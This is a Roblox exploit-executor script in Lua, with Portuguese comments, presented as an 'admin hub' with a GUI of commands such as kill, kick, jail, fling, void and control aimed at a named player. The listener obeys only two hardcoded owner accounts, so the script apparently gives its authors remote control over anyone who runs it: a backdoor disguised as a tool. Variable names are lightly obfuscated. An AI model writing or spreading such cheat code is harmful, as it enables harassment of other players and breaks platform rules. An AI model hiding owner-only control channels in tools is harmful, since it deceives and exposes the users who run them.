--[[ 
    Jotinha12hr2 Hub's Admin - V42.2 (UNIVERSAL EDITION)
    - COMPATIBILIDADE: Delta, Arceus, Codex, Fluxus, Vega X.
    - FIX: Sistema de carregamento otimizado para não crashar.
]]

-- Proteção de execução única
if _G.JotaLoaded then return end
_G.JotaLoaded = true

local _0xV = "V42.2"
local _0xK = {
    ["D1"] = "jotinha12hr2",
    ["D2"] = "amiguinhodoheito",
    ["Msg"] = "Time do Jotinha12hr2 Hub's Admin",
    ["Net"] = "JotaNet_Universal"
}

local _0xG = game
local _0xP = _0xG:GetService("Players")
local _0xL = _0xP.LocalPlayer
local _0xR = _0xG:GetService("RunService")
local _0xS = _0xG:GetService("ReplicatedStorage")

-- Criação segura do canal de rede
local _0xN = _0xS:FindFirstChild(_0xK.Net)
if not _0xN then
    _0xN = Instance.new("StringValue")
    _0xN.Name = _0xK.Net
    _0xN.Parent = _0xS
end

-- Função de Mensagem Global (Otimizada)
local function _0xMsg(txt, col)
    local g = _0xL.PlayerGui:FindFirstChild("JHub_Msg") or Instance.new("ScreenGui", _0xL.PlayerGui)
    g.Name = "JHub_Msg"
    local l = Instance.new("TextLabel", g)
    l.Size = UDim2.new(1, 0, 0, 40)
    l.Position = UDim2.new(0, 0, 0, -50)
    l.BackgroundColor3 = Color3.new(0,0,0)
    l.BackgroundTransparency = 0.4
    l.TextColor3 = col or Color3.new(1,1,1)
    l.Text = "[ GLOBAL ]: " .. tostring(txt):upper()
    l.Font = Enum.Font.SourceSansBold
    l.TextSize = 18
    l.Visible = true
    l:TweenPosition(UDim2.new(0,0,0,10), "Out", "Quad", 0.3)
    task.delay(3.5, function()
        l:TweenPosition(UDim2.new(0,0,0,-50), "In", "Quad", 0.3)
        task.wait(0.4)
        l:Destroy()
    end)
end

-- Função Draggable Universal (Corrigida para Touch e Mouse)
local function _0xDF(obj)
    local dragging, input, startPos, startObjPos
    obj.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = i.Position
            startObjPos = obj.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    _0xG:GetService("UserInputService").InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local delta = i.Position - startPos
            obj.Position = UDim2.new(startObjPos.X.Scale, startObjPos.X.Offset + delta.X, startObjPos.Y.Scale, startObjPos.Y.Offset + delta.Y)
        end
    end)
end

-- Interface Visual
local _0xUI = Instance.new("ScreenGui", _0xL.PlayerGui)
_0xUI.Name = "JHub_Main"
_0xUI.ResetOnSpawn = false

local _0xMB = Instance.new("TextButton", _0xUI)
_0xMB.Size = UDim2.new(0,250,0,45)
_0xMB.Position = UDim2.new(0.5,-125,0,50)
_0xMB.BackgroundColor3 = Color3.fromRGB(25,25,25)
_0xMB.Text = "Jotinha Hub Admin " .. _0xV
_0xMB.TextColor3 = Color3.new(1,1,1)
_0xMB.Font = Enum.Font.SourceSansBold
_0xMB.TextSize = 16
Instance.new("UICorner", _0xMB)
local _0xST = Instance.new("UIStroke", _0xMB)
_0xST.Thickness = 3
_0xDF(_0xMB)

local _0xFR = Instance.new("Frame", _0xUI)
_0xFR.Size = UDim2.new(0,240,0,320)
_0xFR.Position = UDim2.new(0.5,-120,0.5,-160)
_0xFR.BackgroundColor3 = Color3.fromRGB(15,15,15)
_0xFR.Visible = false
Instance.new("UICorner", _0xFR)
local _0xFS = Instance.new("UIStroke", _0xFR)
_0xFS.Thickness = 2
_0xDF(_0xFR)

-- Strobo Neon Loop
local _0xCols = {Color3.new(1,0,0), Color3.new(0,0,1), Color3.new(0.6,0,1)}
_0xR.Heartbeat:Connect(function()
    local c = _0xCols[math.floor((tick()*4)%#_0xCols)+1]
    _0xST.Color = c
    _0xFS.Color = c
    _0xMB.TextColor3 = c
    if _G.JModel then
        for _, p in pairs(_G.JModel:GetChildren()) do if p:IsA("Part") then p.Color = c end end
    end
end)

local _0xBX = Instance.new("TextBox", _0xFR)
_0xBX.Size = UDim2.new(0,200,0,30)
_0xBX.Position = UDim2.new(0.5,-100,0,10)
_0xBX.PlaceholderText = "NICK DO ALVO"
_0xBX.BackgroundColor3 = Color3.fromRGB(35,35,35)
_0xBX.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", _0xBX)

local _0xSF = Instance.new("ScrollingFrame", _0xFR)
_0xSF.Size = UDim2.new(1,-20,1,-60)
_0xSF.Position = UDim2.new(0,10,0,50)
_0xSF.BackgroundTransparency = 1
_0xSF.CanvasSize = UDim2.new(0,0,3,0)
_0xSF.ScrollBarThickness = 2
local _0xLay = Instance.new("UIListLayout", _0xSF)
_0xLay.Padding = UDim.new(0,5)
_0xLay.HorizontalAlignment = Enum.HorizontalAlignment.Center

local cmds = {"Verify","Explode","Kill","Void","Freeze","Unfreeze","Jump","Sit","Kick","Spin","Unspin","Blind","Jail","Unjail","Bring","Fling","Infect","View","Unview","Control","Uncontrol"}

for _, n in pairs(cmds) do
    local b = Instance.new("TextButton", _0xSF)
    b.Size = UDim2.new(1,0,0,30)
    b.Text = n:upper()
    b.BackgroundColor3 = Color3.fromRGB(45,45,45)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.SourceSans
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function()
        _0xN.Value = _0xBX.Text .. "|" .. n:lower() .. "|" .. _0xL.Name
        task.wait(0.2)
        _0xN.Value = ""
    end)
end

_0xMB.MouseButton1Click:Connect(function() _0xFR.Visible = not _0xFR.Visible end)

-- [ LISTENER DE COMANDOS ]
_0xN.Changed:Connect(function(val)
    if val == "" then return end
    local s = string.split(val, "|")
    local alvo, cmd, dono = s[1], s[2], s[3]

    if dono == _0xK.D1 or dono == _0xK.D2 then
        _0xMsg(dono .. " usou " .. cmd .. " em " .. alvo)
    end

    if (alvo:lower() == _0xL.Name:lower() or alvo == "all") and (dono == _0xK.D1 or dono == _0xK.D2) then
        local ch = _0xL.Character
        if ch and ch:FindFirstChild("HumanoidRootPart") then
            local r = ch.HumanoidRootPart
            local h = ch.Humanoid
            
            if cmd == "kill" then h.Health = 0
            elseif cmd == "kick" then _0xL:Kick(_0xK.Msg)
            elseif cmd == "jail" then
                if _G.JModel then _G.JModel:Destroy() end
                _G.Locked = true _G.JPos = r.CFrame
                local m = Instance.new("Model", workspace) _G.JModel = m
                local function part(sz, cf)
                    local p = Instance.new("Part", m)
                    p.Size, p.CFrame, p.Anchored, p.Material, p.CanCollide = sz, cf, true, Enum.Material.Neon, true
                    return p
                end
                part(Vector3.new(10,1,10), _G.JPos * CFrame.new(0,-3.5,0))
                part(Vector3.new(10,1,10), _G.JPos * CFrame.new(0,3.5,0))
                part(Vector3.new(1,7,10), _G.JPos * CFrame.new(4.5,0,0))
                part(Vector3.new(1,7,10), _G.JPos * CFrame.new(-4.5,0,0))
                part(Vector3.new(10,7,1), _G.JPos * CFrame.new(0,0,4.5))
                part(Vector3.new(10,7,1), _G.JPos * CFrame.new(0,0,-4.5))
            elseif cmd == "unjail" then
                _G.Locked = false
                if _G.JModel then _G.JModel:Destroy() _G.JModel = nil end
            elseif cmd == "fling" then h.PlatformStand = true r.Velocity = Vector3.new(0,9999,0)
            elseif cmd == "control" then _G.M_Tr = dono
            elseif cmd == "uncontrol" then _G.M_Tr = nil
            elseif cmd == "void" then r.CFrame = CFrame.new(0,-500,0)
            end
        end
    end
end)

-- Heartbeat Loops
_0xR.Heartbeat:Connect(function()
    if _G.Locked and _G.JPos and _0xL.Character and _0xL.Character:FindFirstChild("HumanoidRootPart") then
        _0xL.Character.HumanoidRootPart.CFrame = _G.JPos
    end
    if _G.M_Tr then
        local t = _0xP:FindFirstChild(_G.M_Tr)
        if t and t.Character and _0xL.Character then
            _0xL.Character.Humanoid:Move(t.Character.Humanoid.MoveDirection, false)
            if t.Character.Humanoid.Jump then _0xL.Character.Humanoid.Jump = true end
        end
    end
end)

_0xMsg("Jotinha Hub V42.2 Carregado!", Color3.new(0,1,0))
